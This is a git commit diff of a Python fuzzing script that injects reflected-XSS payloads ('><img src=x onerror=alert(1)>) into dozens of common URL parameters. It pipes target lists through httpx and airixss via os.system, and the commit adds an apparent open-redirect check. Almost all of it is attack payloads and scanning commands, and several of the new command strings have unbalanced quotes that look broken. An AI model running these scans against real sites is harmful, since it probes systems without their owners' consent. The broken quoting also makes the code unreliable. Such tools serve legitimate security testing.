2d7c18eadda3e10f10afc293aa88cade62480ce9
Erick Fernando <erickfernandoxavier@hotmail.com>
2023-05-21 02:32:23 -0300

    Update param-fuzzer.py

--- param-fuzzer.py
+++ param-fuzzer.py
@@ -19,10 +19,12 @@ payload_xss_3 = "?redirect=%27%22><img src=x onerror=alert(1)>&return=%27%22><im
 
 payload_xss_4 = "?page=%27%22><img src=x onerror=alert(1)>&view=%27%22><img src=x onerror=alert(1)>&section=%27%22><img src=x onerror=alert(1)>&module=%27%22><img src=x onerror=alert(1)>&component=%27%22><img src=x onerror=alert(1)>&task=%27%22><img src=x onerror=alert(1)>&action=%27%22><img src=x onerror=alert(1)>&option=%27%22><img src=x onerror=alert(1)>&format=%27%22><img src=x onerror=alert(1)>&tmpl=%27%22><img src=x onerror=alert(1)>&layout=%27%22><img src=x onerror=alert(1)>&lang=%27%22><img src=x onerror=alert(1)>&language=%27%22><img src=x onerror=alert(1)>&charset=%27%22><img src=x onerror=alert(1)>&stylesheet=%27%22><img src=x onerror=alert(1)>&script=%27%22><img src=x onerror=alert(1)>&js=%27%22><img src=x onerror=alert(1)>"
 
-execucao_xss_1 = "cat '"+urls+""+payload_xss_1+"'|httpx -mc 200 -mr '=alert(1)>' -silent"
-execucao_xss_2 = "cat '"+urls+""+payload_xss_2+"'|httpx -mc 200 -mr '=alert(1)>' -silent"
-execucao_xss_3 = "cat '"+urls+""+payload_xss_3+"'|httpx -mc 200 -mr '=alert(1)>' -silent"
-execucao_xss_4 = "cat '"+urls+""+payload_xss_4+"'|httpx -mc 200 -mr '=alert(1)>' -silent"
+execucao_op_1 = "cat "+args.lista+"|httpx -path '/"+payload_op_1+"'-silent -fr -title|grep 'Example Domain'"
+
+execucao_xss_1 = "cat '"+urls+"|httpx -path '/"+payload_xss_1+"' -mc 200 -mr -silent|airixss -payload '=alert(1)>'"
+execucao_xss_2 = "cat '"+urls+"|httpx -path '/"+payload_xss_2+"' -mc 200 -mr -silent|airixss -payload '=alert(1)>'"
+execucao_xss_3 = "cat '"+urls+"|httpx -path '/"+payload_xss_3+"' -mc 200 -mr -silent|airixss -payload '=alert(1)>'"
+execucao_xss_4 = "cat '"+urls+"|httpx -path '/"+payload_xss_4+"' -mc 200 -mr -silent|airixss -payload '=alert(1)>'"
 
 os.system(execucao_xss_1)
 os.system(execucao_xss_2)
